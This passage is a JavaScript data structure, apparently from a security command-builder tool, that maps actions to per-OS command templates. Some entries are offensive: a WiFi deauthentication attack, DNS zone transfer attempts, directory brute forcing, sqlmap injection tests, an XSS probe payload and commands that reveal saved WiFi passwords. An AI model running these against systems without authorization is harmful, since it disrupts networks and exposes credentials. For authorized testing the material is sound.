                    { name: "host", placeholder: "Target host", required: true }
                ],
                commands: {
                    macos: { cmd: "traceroute {host}", explanation: "Traces the network path to the target host." },
                    linux: { cmd: "traceroute {host}", explanation: "Traces the network path to the target host." },
                    windows: { cmd: "tracert {host}", explanation: "Traces the network path to the target host." }
                }
            }
        }
    },

    // Network Security & Analysis
    netsecurity: {
        label: "Network Security & Analysis",
        actions: {
            packetcapture: {
                label: "Capture network packets",
                parameters: [
                    { name: "interface", placeholder: "Network interface (e.g., eth0)", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo tcpdump -i {interface}", explanation: "Captures packets on the specified interface. Press Ctrl+C to stop." },
                    linux: { cmd: "sudo tcpdump -i {interface}", explanation: "Captures packets on the specified interface. Press Ctrl+C to stop." },
                    windows: { cmd: "netsh trace start capture=yes", explanation: "Starts network tracing. Use 'netsh trace stop' to stop." }
                }
            },
            capturetofile: {
                label: "Capture packets to file",
                parameters: [
                    { name: "interface", placeholder: "Network interface", required: true },
                    { name: "file", placeholder: "Output file (e.g., capture.pcap)", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo tcpdump -i {interface} -w {file}", explanation: "Captures packets and saves to a PCAP file for analysis." },
                    linux: { cmd: "sudo tcpdump -i {interface} -w {file}", explanation: "Captures packets and saves to a PCAP file for analysis." },
                    windows: { cmd: "netsh trace start capture=yes tracefile={file}", explanation: "Captures network traffic to a file." }
                }
            },
            capturehttp: {
                label: "Capture HTTP traffic",
                parameters: [
                    { name: "interface", placeholder: "Network interface", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo tcpdump -i {interface} -A 'tcp port 80 or tcp port 443'", explanation: "Captures HTTP/HTTPS traffic in ASCII format." },
                    linux: { cmd: "sudo tcpdump -i {interface} -A 'tcp port 80 or tcp port 443'", explanation: "Captures HTTP/HTTPS traffic in ASCII format." },
                    windows: { cmd: "netsh trace start capture=yes IPv4.Address=any Protocol=TCP", explanation: "Captures TCP traffic including HTTP." }
                }
            },
            arpwatch: {
                label: "Monitor ARP traffic",
                parameters: [
                    { name: "interface", placeholder: "Network interface", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo tcpdump -i {interface} arp", explanation: "Monitors ARP requests and replies on the network." },
                    linux: { cmd: "sudo tcpdump -i {interface} arp", explanation: "Monitors ARP requests and replies on the network." },
                    windows: { cmd: "arp -a", explanation: "Displays the ARP cache table." }
                }
            },
            arpscan: {
                label: "ARP scan local network",
                parameters: [
                    { name: "subnet", placeholder: "Subnet (e.g., 192.168.1.0/24)", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo arp-scan {subnet}", explanation: "Discovers hosts on the local network using ARP. Install with: brew install arp-scan" },
                    linux: { cmd: "sudo arp-scan {subnet}", explanation: "Discovers hosts on the local network using ARP. Install with: apt install arp-scan" },
                    windows: { cmd: "arp -a", explanation: "Displays known hosts from ARP cache." }
                }
            },
            netstat: {
                label: "Show all network connections",
                parameters: [],
                commands: {
                    macos: { cmd: "netstat -an", explanation: "Displays all active network connections and listening ports." },
                    linux: { cmd: "ss -tunapl", explanation: "Shows all TCP/UDP connections with process info." },
                    windows: { cmd: "netstat -ano", explanation: "Displays all connections with process IDs." }
                }
            },
            establishedconn: {
                label: "Show established connections",
                parameters: [],
                commands: {
                    macos: { cmd: "netstat -an | grep ESTABLISHED", explanation: "Shows only established network connections." },
                    linux: { cmd: "ss -tunapl | grep ESTAB", explanation: "Shows only established connections." },
                    windows: { cmd: "netstat -an | findstr ESTABLISHED", explanation: "Shows only established connections." }
                }
            },
            listenports: {
                label: "Show listening ports",
                parameters: [],
                commands: {
                    macos: { cmd: "lsof -i -P -n | grep LISTEN", explanation: "Shows all listening ports with process information." },
                    linux: { cmd: "ss -tulpn", explanation: "Shows all TCP/UDP listening ports with process info." },
                    windows: { cmd: "netstat -an | findstr LISTENING", explanation: "Shows all listening ports." }
                }
            },
            dnsquery: {
                label: "DNS query with type",
                parameters: [
                    { name: "domain", placeholder: "Domain name", required: true },
                    { name: "type", placeholder: "Record type (A, MX, NS, TXT, etc.)", required: true }
                ],
                commands: {
                    macos: { cmd: "dig {domain} {type}", explanation: "Queries specific DNS record type for the domain." },
                    linux: { cmd: "dig {domain} {type}", explanation: "Queries specific DNS record type for the domain." },
                    windows: { cmd: "nslookup -type={type} {domain}", explanation: "Queries specific DNS record type for the domain." }
                }
            },
            reversedns: {
                label: "Reverse DNS lookup",
                parameters: [
                    { name: "ip", placeholder: "IP address", required: true }
                ],
                commands: {
                    macos: { cmd: "dig -x {ip}", explanation: "Performs reverse DNS lookup for the IP address." },
                    linux: { cmd: "dig -x {ip}", explanation: "Performs reverse DNS lookup for the IP address." },
                    windows: { cmd: "nslookup {ip}", explanation: "Performs reverse DNS lookup for the IP address." }
                }
            },
            zonetransfer: {
                label: "DNS zone transfer attempt",
                parameters: [
                    { name: "domain", placeholder: "Domain name", required: true },
                    { name: "ns", placeholder: "DNS server", required: true }
                ],
                commands: {
                    macos: { cmd: "dig @{ns} {domain} AXFR", explanation: "Attempts a DNS zone transfer from the nameserver." },
                    linux: { cmd: "dig @{ns} {domain} AXFR", explanation: "Attempts a DNS zone transfer from the nameserver." },
                    windows: { cmd: "nslookup -type=AXFR {domain} {ns}", explanation: "Attempts a DNS zone transfer from the nameserver." }
                }
            },
            sslcheck: {
                label: "Check SSL/TLS certificate",
                parameters: [
                    { name: "host", placeholder: "Hostname", required: true },
                    { name: "port", placeholder: "Port (default 443)", required: false }
                ],
                commands: {
                    macos: { cmd: "openssl s_client -connect {host}:{port} -servername {host} < /dev/null 2>/dev/null | openssl x509 -noout -dates -subject", explanation: "Shows SSL certificate details including expiry date." },
                    linux: { cmd: "openssl s_client -connect {host}:{port} -servername {host} < /dev/null 2>/dev/null | openssl x509 -noout -dates -subject", explanation: "Shows SSL certificate details including expiry date." },
                    windows: { cmd: "openssl s_client -connect {host}:{port} -servername {host}", explanation: "Shows SSL certificate details." }
                }
            },
            sslciphers: {
                label: "Test SSL/TLS ciphers",
                parameters: [
                    { name: "host", placeholder: "Hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap --script ssl-enum-ciphers -p 443 {host}", explanation: "Enumerates supported SSL/TLS ciphers on the host." },
                    linux: { cmd: "nmap --script ssl-enum-ciphers -p 443 {host}", explanation: "Enumerates supported SSL/TLS ciphers on the host." },
                    windows: { cmd: "nmap --script ssl-enum-ciphers -p 443 {host}", explanation: "Enumerates supported SSL/TLS ciphers on the host." }
                }
            }
        }
    },

    // Cryptography & Hashing
    crypto: {
        label: "Cryptography & Hashing",
        actions: {
            md5hash: {
                label: "Calculate MD5 hash",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "md5 {file}", explanation: "Calculates MD5 hash of the file (not cryptographically secure)." },
                    linux: { cmd: "md5sum {file}", explanation: "Calculates MD5 hash of the file (not cryptographically secure)." },
                    windows: { cmd: "certutil -hashfile {file} MD5", explanation: "Calculates MD5 hash of the file." }
                }
            },
            sha256hash: {
                label: "Calculate SHA-256 hash",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "shasum -a 256 {file}", explanation: "Calculates SHA-256 hash of the file." },
                    linux: { cmd: "sha256sum {file}", explanation: "Calculates SHA-256 hash of the file." },
                    windows: { cmd: "certutil -hashfile {file} SHA256", explanation: "Calculates SHA-256 hash of the file." }
                }
            },
            sha1hash: {
                label: "Calculate SHA-1 hash",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "shasum -a 1 {file}", explanation: "Calculates SHA-1 hash of the file." },
                    linux: { cmd: "sha1sum {file}", explanation: "Calculates SHA-1 hash of the file." },
                    windows: { cmd: "certutil -hashfile {file} SHA1", explanation: "Calculates SHA-1 hash of the file." }
                }
            },
            hashstring: {
                label: "Hash a string (SHA-256)",
                parameters: [
                    { name: "text", placeholder: "Text to hash", required: true }
                ],
                commands: {
                    macos: { cmd: "echo -n \"{text}\" | shasum -a 256", explanation: "Calculates SHA-256 hash of the text string." },
                    linux: { cmd: "echo -n \"{text}\" | sha256sum", explanation: "Calculates SHA-256 hash of the text string." },
                    windows: { cmd: "powershell -Command \"[System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes('{text}'))) -replace '-',''\"", explanation: "Calculates SHA-256 hash of the text." }
                }
            },
            base64encode: {
                label: "Base64 encode",
                parameters: [
                    { name: "text", placeholder: "Text to encode", required: true }
                ],
                commands: {
                    macos: { cmd: "echo -n \"{text}\" | base64", explanation: "Encodes the text to Base64 format." },
                    linux: { cmd: "echo -n \"{text}\" | base64", explanation: "Encodes the text to Base64 format." },
                    windows: { cmd: "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{text}'))\"", explanation: "Encodes the text to Base64 format." }
                }
            },
            base64decode: {
                label: "Base64 decode",
                parameters: [
                    { name: "encoded", placeholder: "Base64 encoded string", required: true }
                ],
                commands: {
                    macos: { cmd: "echo \"{encoded}\" | base64 -d", explanation: "Decodes Base64 encoded text." },
                    linux: { cmd: "echo \"{encoded}\" | base64 -d", explanation: "Decodes Base64 encoded text." },
                    windows: { cmd: "powershell -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}'))\"", explanation: "Decodes Base64 encoded text." }
                }
            },
            encryptfile: {
                label: "Encrypt a file (AES-256)",
                parameters: [
                    { name: "file", placeholder: "File to encrypt", required: true },
                    { name: "output", placeholder: "Output file", required: true }
                ],
                commands: {
                    macos: { cmd: "openssl enc -aes-256-cbc -salt -in {file} -out {output}", explanation: "Encrypts file using AES-256-CBC. You will be prompted for a password." },
                    linux: { cmd: "openssl enc -aes-256-cbc -salt -in {file} -out {output}", explanation: "Encrypts file using AES-256-CBC. You will be prompted for a password." },
                    windows: { cmd: "openssl enc -aes-256-cbc -salt -in {file} -out {output}", explanation: "Encrypts file using AES-256-CBC. You will be prompted for a password." }
                }
            },
            decryptfile: {
                label: "Decrypt a file (AES-256)",
                parameters: [
                    { name: "file", placeholder: "Encrypted file", required: true },
                    { name: "output", placeholder: "Output file", required: true }
                ],
                commands: {
                    macos: { cmd: "openssl enc -aes-256-cbc -d -in {file} -out {output}", explanation: "Decrypts an AES-256-CBC encrypted file." },
                    linux: { cmd: "openssl enc -aes-256-cbc -d -in {file} -out {output}", explanation: "Decrypts an AES-256-CBC encrypted file." },
                    windows: { cmd: "openssl enc -aes-256-cbc -d -in {file} -out {output}", explanation: "Decrypts an AES-256-CBC encrypted file." }
                }
            },
            genrsakey: {
                label: "Generate RSA key pair",
                parameters: [
                    { name: "keyfile", placeholder: "Key filename (without extension)", required: true }
                ],
                commands: {
                    macos: { cmd: "openssl genrsa -out {keyfile}.pem 4096 && openssl rsa -in {keyfile}.pem -pubout -out {keyfile}_pub.pem", explanation: "Generates a 4096-bit RSA private/public key pair." },
                    linux: { cmd: "openssl genrsa -out {keyfile}.pem 4096 && openssl rsa -in {keyfile}.pem -pubout -out {keyfile}_pub.pem", explanation: "Generates a 4096-bit RSA private/public key pair." },
                    windows: { cmd: "openssl genrsa -out {keyfile}.pem 4096 && openssl rsa -in {keyfile}.pem -pubout -out {keyfile}_pub.pem", explanation: "Generates a 4096-bit RSA private/public key pair." }
                }
            },
            gensshkey: {
                label: "Generate SSH key pair",
                parameters: [
                    { name: "email", placeholder: "Your email address", required: true }
                ],
                commands: {
                    macos: { cmd: "ssh-keygen -t ed25519 -C \"{email}\"", explanation: "Generates an Ed25519 SSH key pair for authentication." },
                    linux: { cmd: "ssh-keygen -t ed25519 -C \"{email}\"", explanation: "Generates an Ed25519 SSH key pair for authentication." },
                    windows: { cmd: "ssh-keygen -t ed25519 -C \"{email}\"", explanation: "Generates an Ed25519 SSH key pair for authentication." }
                }
            },
            genpassword: {
                label: "Generate random password",
                parameters: [
                    { name: "length", placeholder: "Password length (e.g., 32)", required: true }
                ],
                commands: {
                    macos: { cmd: "openssl rand -base64 {length} | head -c {length}", explanation: "Generates a random password of specified length." },
                    linux: { cmd: "openssl rand -base64 {length} | head -c {length}", explanation: "Generates a random password of specified length." },
                    windows: { cmd: "powershell -Command \"[System.Web.Security.Membership]::GeneratePassword({length}, 4)\"", explanation: "Generates a random password of specified length." }
                }
            },
            verifyhash: {
                label: "Verify file hash",
                parameters: [
                    { name: "file", placeholder: "File path", required: true },
                    { name: "hash", placeholder: "Expected SHA-256 hash", required: true }
                ],
                commands: {
                    macos: { cmd: "echo \"{hash}  {file}\" | shasum -a 256 -c", explanation: "Verifies if the file matches the expected SHA-256 hash." },
                    linux: { cmd: "echo \"{hash}  {file}\" | sha256sum -c", explanation: "Verifies if the file matches the expected SHA-256 hash." },
                    windows: { cmd: "powershell -Command \"if ((Get-FileHash {file} -Algorithm SHA256).Hash -eq '{hash}') { 'MATCH' } else { 'NO MATCH' }\"", explanation: "Verifies if the file matches the expected hash." }
                }
            }
        }
    },

    // Wireless Security
    wireless: {
        label: "Wireless Security",
        actions: {
            listwifi: {
                label: "List available WiFi networks",
                parameters: [],
                commands: {
                    macos: { cmd: "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s", explanation: "Scans and lists nearby WiFi networks." },
                    linux: { cmd: "sudo iwlist wlan0 scan | grep -E 'ESSID|Signal'", explanation: "Scans for nearby WiFi networks." },
                    windows: { cmd: "netsh wlan show networks mode=bssid", explanation: "Lists available WiFi networks with details." }
                }
            },
            wifiinfo: {
                label: "Current WiFi connection info",
                parameters: [],
                commands: {
                    macos: { cmd: "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I", explanation: "Shows current WiFi connection details." },
                    linux: { cmd: "iwconfig wlan0", explanation: "Shows current wireless interface configuration." },
                    windows: { cmd: "netsh wlan show interfaces", explanation: "Shows current WiFi connection details." }
                }
            },
            savedwifi: {
                label: "List saved WiFi profiles",
                parameters: [],
                commands: {
                    macos: { cmd: "networksetup -listpreferredwirelessnetworks en0", explanation: "Lists all saved WiFi networks." },
                    linux: { cmd: "ls /etc/NetworkManager/system-connections/", explanation: "Lists saved WiFi connection profiles." },
                    windows: { cmd: "netsh wlan show profiles", explanation: "Lists all saved WiFi profiles." }
                }
            },
            wifipassword: {
                label: "Show WiFi password (saved)",
                parameters: [
                    { name: "ssid", placeholder: "WiFi network name (SSID)", required: true }
                ],
                commands: {
                    macos: { cmd: "security find-generic-password -ga \"{ssid}\" 2>&1 | grep password", explanation: "Retrieves saved WiFi password from keychain (requires admin)." },
                    linux: { cmd: "sudo cat /etc/NetworkManager/system-connections/\"{ssid}\" | grep psk=", explanation: "Shows the saved password for the WiFi network." },
                    windows: { cmd: "netsh wlan show profile name=\"{ssid}\" key=clear", explanation: "Shows the saved WiFi password in clear text." }
                }
            },
            monitormode: {
                label: "Enable monitor mode",
                parameters: [
                    { name: "interface", placeholder: "Wireless interface (e.g., wlan0)", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport {interface} sniff 1", explanation: "Enables packet sniffing on the wireless interface." },
                    linux: { cmd: "sudo airmon-ng start {interface}", explanation: "Enables monitor mode using aircrack-ng suite." },
                    windows: { cmd: "echo 'Monitor mode requires specialized drivers on Windows'", explanation: "Windows requires specialized drivers for monitor mode." }
                }
            },
            wificapture: {
                label: "Capture WiFi packets",
                parameters: [
                    { name: "interface", placeholder: "Monitor interface (e.g., wlan0mon)", required: true },
                    { name: "file", placeholder: "Output file prefix", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo tcpdump -i {interface} -w {file}.pcap", explanation: "Captures wireless packets to a file." },
                    linux: { cmd: "sudo airodump-ng {interface} -w {file}", explanation: "Captures WiFi packets including handshakes." },
                    windows: { cmd: "netsh trace start capture=yes wireless=yes tracefile={file}.etl", explanation: "Captures wireless network traffic." }
                }
            },
            deauth: {
                label: "Deauthentication attack (testing)",
                parameters: [
                    { name: "bssid", placeholder: "Target AP BSSID", required: true },
                    { name: "interface", placeholder: "Monitor interface", required: true }
                ],
                commands: {
                    macos: { cmd: "echo 'Use aireplay-ng on Linux for deauth testing'", explanation: "macOS doesn't natively support deauth attacks." },
                    linux: { cmd: "sudo aireplay-ng -0 5 -a {bssid} {interface}", explanation: "Sends 5 deauth packets to test WiFi security (requires authorization)." },
                    windows: { cmd: "echo 'Use Linux with aircrack-ng for deauth testing'", explanation: "Windows doesn't natively support deauth attacks." }
                }
            },
            bluetoothscan: {
                label: "Scan Bluetooth devices",
                parameters: [],
                commands: {
                    macos: { cmd: "system_profiler SPBluetoothDataType", explanation: "Shows Bluetooth devices and configuration." },
                    linux: { cmd: "hcitool scan", explanation: "Scans for nearby Bluetooth devices." },
                    windows: { cmd: "powershell -Command \"Get-PnpDevice -Class Bluetooth\"", explanation: "Lists Bluetooth devices." }
                }
            }
        }
    },

    // Web Security Testing
    websecurity: {
        label: "Web Security Testing",
        actions: {
            curlheaders: {
                label: "View HTTP response headers",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -I {url}", explanation: "Retrieves only HTTP headers from the URL." },
                    linux: { cmd: "curl -I {url}", explanation: "Retrieves only HTTP headers from the URL." },
                    windows: { cmd: "curl -I {url}", explanation: "Retrieves only HTTP headers from the URL." }
                }
            },
            curlverbose: {
                label: "Verbose HTTP request",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -v {url}", explanation: "Shows detailed request and response information." },
                    linux: { cmd: "curl -v {url}", explanation: "Shows detailed request and response information." },
                    windows: { cmd: "curl -v {url}", explanation: "Shows detailed request and response information." }
                }
            },
            curlpost: {
                label: "Send POST request",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true },
                    { name: "data", placeholder: "POST data (key=value&key2=value2)", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -X POST -d \"{data}\" {url}", explanation: "Sends a POST request with form data." },
                    linux: { cmd: "curl -X POST -d \"{data}\" {url}", explanation: "Sends a POST request with form data." },
                    windows: { cmd: "curl -X POST -d \"{data}\" {url}", explanation: "Sends a POST request with form data." }
                }
            },
            curljson: {
                label: "Send JSON POST request",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true },
                    { name: "json", placeholder: "JSON data", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -X POST -H \"Content-Type: application/json\" -d '{json}' {url}", explanation: "Sends a POST request with JSON payload." },
                    linux: { cmd: "curl -X POST -H \"Content-Type: application/json\" -d '{json}' {url}", explanation: "Sends a POST request with JSON payload." },
                    windows: { cmd: "curl -X POST -H \"Content-Type: application/json\" -d \"{json}\" {url}", explanation: "Sends a POST request with JSON payload." }
                }
            },
            curlcookie: {
                label: "Send request with cookies",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true },
                    { name: "cookies", placeholder: "Cookies (name=value; name2=value2)", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -b \"{cookies}\" {url}", explanation: "Sends request with specified cookies." },
                    linux: { cmd: "curl -b \"{cookies}\" {url}", explanation: "Sends request with specified cookies." },
                    windows: { cmd: "curl -b \"{cookies}\" {url}", explanation: "Sends request with specified cookies." }
                }
            },
            curluseragent: {
                label: "Request with custom User-Agent",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true },
                    { name: "useragent", placeholder: "User-Agent string", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -A \"{useragent}\" {url}", explanation: "Sends request with custom User-Agent header." },
                    linux: { cmd: "curl -A \"{useragent}\" {url}", explanation: "Sends request with custom User-Agent header." },
                    windows: { cmd: "curl -A \"{useragent}\" {url}", explanation: "Sends request with custom User-Agent header." }
                }
            },
            nikto: {
                label: "Web server vulnerability scan",
                parameters: [
                    { name: "host", placeholder: "Target host/URL", required: true }
                ],
                commands: {
                    macos: { cmd: "nikto -h {host}", explanation: "Scans web server for known vulnerabilities. Install with: brew install nikto" },
                    linux: { cmd: "nikto -h {host}", explanation: "Scans web server for known vulnerabilities. Install with: apt install nikto" },
                    windows: { cmd: "nikto -h {host}", explanation: "Scans web server for known vulnerabilities." }
                }
            },
            dirbrute: {
                label: "Directory brute force",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true },
                    { name: "wordlist", placeholder: "Wordlist path", required: true }
                ],
                commands: {
                    macos: { cmd: "gobuster dir -u {url} -w {wordlist}", explanation: "Brute forces directories and files. Install with: brew install gobuster" },
                    linux: { cmd: "gobuster dir -u {url} -w {wordlist}", explanation: "Brute forces directories and files. Install with: apt install gobuster" },
                    windows: { cmd: "gobuster dir -u {url} -w {wordlist}", explanation: "Brute forces directories and files." }
                }
            },
            whatweb: {
                label: "Identify web technologies",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true }
                ],
                commands: {
                    macos: { cmd: "whatweb {url}", explanation: "Identifies CMS, frameworks, and web technologies. Install with: brew install whatweb" },
                    linux: { cmd: "whatweb {url}", explanation: "Identifies CMS, frameworks, and web technologies. Install with: apt install whatweb" },
                    windows: { cmd: "curl -s {url} | findstr -i \"generator\\|powered\"", explanation: "Basic technology detection via HTML meta tags." }
                }
            },
            wpscan: {
                label: "WordPress vulnerability scan",
                parameters: [
                    { name: "url", placeholder: "WordPress site URL", required: true }
                ],
                commands: {
                    macos: { cmd: "wpscan --url {url}", explanation: "Scans WordPress sites for vulnerabilities. Install with: brew install wpscan" },
                    linux: { cmd: "wpscan --url {url}", explanation: "Scans WordPress sites for vulnerabilities. Install with: apt install wpscan" },
                    windows: { cmd: "wpscan --url {url}", explanation: "Scans WordPress sites for vulnerabilities." }
                }
            },
            securityheaders: {
                label: "Check security headers",
                parameters: [
                    { name: "url", placeholder: "Target URL", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -sI {url} | grep -iE 'strict-transport|content-security|x-frame|x-xss|x-content-type'", explanation: "Checks for common security headers." },
                    linux: { cmd: "curl -sI {url} | grep -iE 'strict-transport|content-security|x-frame|x-xss|x-content-type'", explanation: "Checks for common security headers." },
                    windows: { cmd: "curl -sI {url} | findstr /i \"strict-transport content-security x-frame x-xss x-content-type\"", explanation: "Checks for common security headers." }
                }
            },
            sqlmap: {
                label: "SQL injection test",
                parameters: [
                    { name: "url", placeholder: "Target URL with parameter (e.g., site.com/page?id=1)", required: true }
                ],
                commands: {
                    macos: { cmd: "sqlmap -u \"{url}\" --batch", explanation: "Tests for SQL injection vulnerabilities. Install with: brew install sqlmap" },
                    linux: { cmd: "sqlmap -u \"{url}\" --batch", explanation: "Tests for SQL injection vulnerabilities. Install with: apt install sqlmap" },
                    windows: { cmd: "sqlmap -u \"{url}\" --batch", explanation: "Tests for SQL injection vulnerabilities." }
                }
            },
            xsstester: {
                label: "Test for XSS reflection",
                parameters: [
                    { name: "url", placeholder: "URL with parameter to test", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -s \"{url}<script>alert(1)</script>\" | grep -o '<script>alert(1)</script>'", explanation: "Basic XSS reflection test." },
                    linux: { cmd: "curl -s \"{url}<script>alert(1)</script>\" | grep -o '<script>alert(1)</script>'", explanation: "Basic XSS reflection test." },
                    windows: { cmd: "curl -s \"{url}<script>alert(1)</script>\" | findstr \"<script>alert(1)</script>\"", explanation: "Basic XSS reflection test." }
                }
            }
        }
    },

    // Forensics & Recovery
    forensics: {
        label: "Forensics & Recovery",
        actions: {
            diskimage: {
                label: "Create disk image",
                parameters: [
                    { name: "source", placeholder: "Source disk (e.g., /dev/sda)", required: true },
                    { name: "dest", placeholder: "Destination file path", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo dd if={source} of={dest} bs=4M status=progress", explanation: "Creates a bit-for-bit copy of the disk." },
                    linux: { cmd: "sudo dd if={source} of={dest} bs=4M status=progress", explanation: "Creates a bit-for-bit copy of the disk." },
                    windows: { cmd: "wmic diskdrive list brief", explanation: "List disks first, then use FTK Imager for imaging." }
                }
            },
            filemetadata: {
                label: "Extract file metadata",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "mdls {file}", explanation: "Displays Spotlight metadata attributes for the file." },
                    linux: { cmd: "exiftool {file}", explanation: "Extracts metadata from the file. Install with: apt install exiftool" },
                    windows: { cmd: "powershell -Command \"Get-ItemProperty {file} | Format-List *\"", explanation: "Shows file properties and metadata." }
                }
            },
            imagemeta: {
                label: "Extract image EXIF data",
                parameters: [
                    { name: "image", placeholder: "Image file path", required: true }
                ],
                commands: {
                    macos: { cmd: "exiftool {image}", explanation: "Extracts EXIF metadata from images. Install with: brew install exiftool" },
                    linux: { cmd: "exiftool {image}", explanation: "Extracts EXIF metadata from images. Install with: apt install libimage-exiftool-perl" },
                    windows: { cmd: "exiftool {image}", explanation: "Extracts EXIF metadata from images." }
                }
            },
            deletedfiles: {
                label: "List recently deleted files",
                parameters: [],
                commands: {
                    macos: { cmd: "ls -la ~/.Trash/", explanation: "Lists files in the Trash folder." },
                    linux: { cmd: "ls -la ~/.local/share/Trash/files/", explanation: "Lists files in the Trash folder." },
                    windows: { cmd: "powershell -Command \"Get-ChildItem 'C:\\$Recycle.Bin' -Force -Recurse\"", explanation: "Lists files in the Recycle Bin." }
                }
            },
            filestrings: {
                label: "Extract strings from file",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "strings {file}", explanation: "Extracts printable strings from binary files." },
                    linux: { cmd: "strings {file}", explanation: "Extracts printable strings from binary files." },
                    windows: { cmd: "strings {file}", explanation: "Extracts printable strings. Download from Sysinternals." }
                }
            },
            hexdump: {
                label: "View file hex dump",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "xxd {file} | head -100", explanation: "Shows hexadecimal dump of the file (first 100 lines)." },
                    linux: { cmd: "xxd {file} | head -100", explanation: "Shows hexadecimal dump of the file (first 100 lines)." },
                    windows: { cmd: "format-hex {file} | Select-Object -First 100", explanation: "Shows hexadecimal dump in PowerShell." }
                }
            },
            filesignature: {
                label: "Check file magic bytes",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "file {file} && xxd {file} | head -1", explanation: "Identifies file type and shows magic bytes." },
                    linux: { cmd: "file {file} && xxd {file} | head -1", explanation: "Identifies file type and shows magic bytes." },
                    windows: { cmd: "powershell -Command \"[System.IO.File]::ReadAllBytes('{file}')[0..15] | ForEach-Object { '{0:X2}' -f $_ }\"", explanation: "Shows first 16 bytes of the file." }
                }
            },
            loginhistory: {
                label: "View login history",
                parameters: [],
                commands: {
                    macos: { cmd: "last", explanation: "Shows recent login history." },
                    linux: { cmd: "last -a", explanation: "Shows recent login history with hostnames." },
                    windows: { cmd: "wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:20 /f:text", explanation: "Shows recent login events from Security log." }
                }
            },
            failedlogins: {
                label: "View failed login attempts",
                parameters: [],
                commands: {
                    macos: { cmd: "log show --predicate 'eventMessage contains \"failed\"' --last 1h", explanation: "Shows failed authentication attempts in the last hour." },
                    linux: { cmd: "grep -i 'failed\\|failure' /var/log/auth.log | tail -50", explanation: "Shows recent failed login attempts." },
                    windows: { cmd: "wevtutil qe Security /q:\"*[System[(EventID=4625)]]\" /c:20 /f:text", explanation: "Shows failed login events from Security log." }
                }
            },
            bashhistory: {
                label: "View command history",
                parameters: [],
                commands: {
                    macos: { cmd: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -100", explanation: "Shows last 100 commands from shell history." },
                    linux: { cmd: "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -100", explanation: "Shows last 100 commands from shell history." },
                    windows: { cmd: "Get-Content (Get-PSReadlineOption).HistorySavePath | Select-Object -Last 100", explanation: "Shows last 100 PowerShell commands." }
                }
            },
            runningservices: {
                label: "List running services",
                parameters: [],
                commands: {
                    macos: { cmd: "launchctl list", explanation: "Lists all running launchd services." },
                    linux: { cmd: "systemctl list-units --type=service --state=running", explanation: "Lists all running systemd services." },
                    windows: { cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'}", explanation: "Lists all running Windows services." }
                }
            },
            cronjobs: {
                label: "List scheduled tasks",
                parameters: [],
                commands: {
                    macos: { cmd: "crontab -l && ls -la /Library/LaunchDaemons/", explanation: "Lists cron jobs and launch daemons." },
                    linux: { cmd: "crontab -l && ls -la /etc/cron.*", explanation: "Lists cron jobs for current user and system." },
                    windows: { cmd: "schtasks /query /fo LIST", explanation: "Lists all scheduled tasks." }
                }
            },
            networkconns: {
                label: "List network connections with PIDs",
                parameters: [],
                commands: {
                    macos: { cmd: "lsof -i -P", explanation: "Lists all network connections with process information." },
                    linux: { cmd: "ss -tunapl", explanation: "Lists all network connections with process information." },
                    windows: { cmd: "netstat -ano", explanation: "Lists all network connections with process IDs." }
                }
            },
            memoryusage: {
                label: "Detailed memory analysis",
                parameters: [],
                commands: {
                    macos: { cmd: "vm_stat && top -l 1 | head -15", explanation: "Shows virtual memory statistics and top processes." },
                    linux: { cmd: "free -h && cat /proc/meminfo | head -20", explanation: "Shows detailed memory information." },
                    windows: { cmd: "systeminfo | findstr /C:\"Total Physical Memory\" /C:\"Available Physical Memory\"", explanation: "Shows memory information." }
                }
            }
        }
    },

    // Password & Authentication Testing
    passwordtest: {
        label: "Password & Authentication Testing",
        actions: {
            hashidentify: {
                label: "Identify hash type",
                parameters: [
                    { name: "hash", placeholder: "Hash string to identify", required: true }
                ],
                commands: {
                    macos: { cmd: "hashid \"{hash}\"", explanation: "Identifies the type of hash. Install with: pip install hashid" },
                    linux: { cmd: "hashid \"{hash}\"", explanation: "Identifies the type of hash. Install with: apt install hashid" },
